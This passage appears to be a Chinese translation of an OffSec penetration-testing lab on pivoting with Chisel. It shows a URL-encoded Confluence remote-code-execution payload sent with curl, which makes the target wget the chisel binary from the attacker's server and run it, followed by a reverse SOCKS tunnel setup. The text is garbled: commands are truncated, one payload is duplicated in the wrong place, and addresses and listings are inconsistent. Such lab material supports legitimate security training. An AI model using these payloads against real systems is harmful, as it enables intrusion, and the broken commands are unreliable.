
Chisel 使用客户端/服务器模型。必须建立一个 Chisel 服务器，它可以接受 Chisel 客户端的连接。根据服务器和客户端的配置，有多种端口转发选项可用。其中特别有用的是反向端口转发，它类似于 SSH 远程端口转发。

> 906 (Github, 2022), https://github.com/jillora/chisel

如果我们预期的客户端运行在不同的操作系统或架构上，我们需要从 Chisel 的 Github releases 页面下载对应操作系统和架构的二进制文件。

在这种情况下，CONFLUENCE01 和我们的 Kali 机器都是 amd64 Linux 。这意味着我们可以简单地在 Kali 上上提供相同的 chisel 二进制文件，并在 CONFLUENCE01 上运行它。我们可以将 chisel 二进制文件复制到 Apache2 服务器的 web 根目录。

```
kali@kali:~$ sudo cp $(chisel) /var/www/html/
kali@kali:~$ 
```

列表 586 - 将 chisel 二进制文件拷贝到 Apache2 服务器加载器

然后，我们可以确保 Apache2 在我们的机器上运行。

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
kali@kali:~$ 
```

列表 587 - 启动 Apache2

接下来，我们将构建最终将在 CONFLUENCE01 的 web shell 中运行的 `wget` 命令。该命令将 chisel 二进制文件下载到 `/tmp/chisel` 并使其具有可执行性。

```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

列表 588 - 我们用于在 CONFLUENCE01 上将 chisel 二进制文件下载到 `/tmp/chisel` 并使其执行的 `wget` 负载

接下来，我们将格式化该命令以配合 curl Confluence 注入：

> 之前一样，你可以根据需要修改 URL 编码的 RCE 负载的特定部分，而不是从头构建新的负载，以避免格式化上的困难。

```
kali@kali:~$ curl
http://192.168.50.63:8090/%2B%20javascript.script.ScriptEngineManager%28%29.getByName%28%22hashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%20%22%22%27wget%27%20%20192.168.118.4/chisel%20%2D%20/tmp/chisel%27%29.start%22%22%22%7D/
kali@kali:~$ 
```

列表 589 - 在我们的 curl Confluence 注入命令中执行的 `wget` 命令

Apache2 日志 `/var/apache2/access.log` 最终显示了对 chisel 二文件的请求：

```
kali@kali:-$ tail -f /var/log/apache2/access.log
```

```
...
192.168.50.63 - [21/Aug/2022:17:41:49 -0400] "GET /HTTP/1.1" 200 8750339 "-" Wget -i/1.2.0.3 (linux-gnu)"
```

列表 590 - 击中我们 Apache2 服务器的 chisel 请求。

现在我们在 Kali 机器和目标机器上都有 Chisel 二进制文件，可以运行它们了。在 Kali 机器上，我们将使用 `server` 子命令启动服务器，并带有 `bind (--port)` 和 `--reverse` 标志注入以允许反向端口转发。

```
kali@kali:-$ server --port 8080 --reverse
2022/07/22 16:43:22 server: Reverse tunelling enabled
2022/07/22 16:43:22 server: Fingerprint mZANuWndvrRnJgBasGQtqbbe0tKKanpoQqJgNy7:
2022/07/22 16:43:22 server: Listening on http://0.0.0.0
```

列表 591 - 在端口 8080 上启动服务器。

Chisel 服务器已启动并监听端口 8080，反向隧道已启用。在我们运行 chisel 之前，我们将在 Kali 机器上创建隧道。使用 `tcpdump` 监听端口 8080 来捕获流量。

```
kali@kali:-$ sudo tcpdump tun port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
tcpdump: listening on tun0 via tcp/port 8080
```

接下来，我们将启动 隧道，在 Kali 机器上绑定地址和端口选项。通过重定向到 `/dev/null` 强制进程在后台运行。

```
kali@kali:~$ chisel client -s 192.168.1.4:8080 > /dev/null
```

列表 592 - 从 web shell 启动 chisel 客户端。

```
kali@kali:-~$ curl http://192.168.50.63:8090/%2B%20javascript.script.ScriptEngineManager%28%29.getByName%28%22hashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%20%22%22%27wget%27%20%20192.168.118.4/chisel%20%2D%20/tmp/chisel%27%29.start%22%22%22%7D/
```

列表 593 - 使用注入启动 chisel 客户端。

然后我们将创建一个注入，并连接到 CONFLUENCE01。Tcpdump 立即显示了流向 Chisel 服务器的流量，其中一些是熟悉的。

流量表明 chisel 客户端已与建立了 HTTP WebSocket 连接。

我们的 Chisel 服务器记录了一个入站连接。

```
kali@kali: chisel server --port 8080 --reverse
2022/08/21 17:57:52 server: Route tunneling enabled
2022/08/21 17:57:52 server: Fingerprint PrAuAFgUnExYKI14RMMeItaCcmJ6kj4zsaS2LX77
2022/08/21 17:57:52 server: Listening on http://0.0.0.0:8080
```

接下来，我们检查我们的 SOCKS 代理的状态。

```
kali@kali: ss -ntlpu
Netid State Recv-Q Send-Q Local Address:Port Peer
Address:Port Process
udp UNCONN 0 0 0.0.0.0:34877 0.0.0.0:*
tcp LISTEN 0 4096 127.0.0.1:1080
```

# OffSec

使用 Kali Linux 进行渗透测试

```
0.0.0.0*: users:(("chisel",pid=50121,fd=2))
tcp             LISTEN   4096*:8080
tcp             *:users:(("chisel",pid=50121,fd=2))
tcp             LISTEN   511*:8080
```

列表 597 - 使用 `ss` 检查 SOCKS 端口是否打开

SOCKS 端口 1080 正在监听 Kali 机器的环回接口上。让我们利用它连接到 PGDATABASE01 上的 SSH 服务器。在“重定向和 SSH 隧道”中，我们创建了带有动态转发的 SOCKS 端口，但尚未通过 SOCKS 代理运行 SSH 本。SSH 不提供通用的 SOCKS 代理命令，而是提供了一个 `ProxyCommand` 选项。我们可以将其写入配置文件，或者作为命令行的一部分传递。`ProxyCommand` 接受一个用于打开启用代理通道的 shell 命令。文档建议使用 OpenBSD 版本的 Netcat，但它不支持 SOCKS 代理。然而，我们使用了编写者提供的替代方案 Ncat。

列表 598 - 使用 `apt` 安装 Ncat
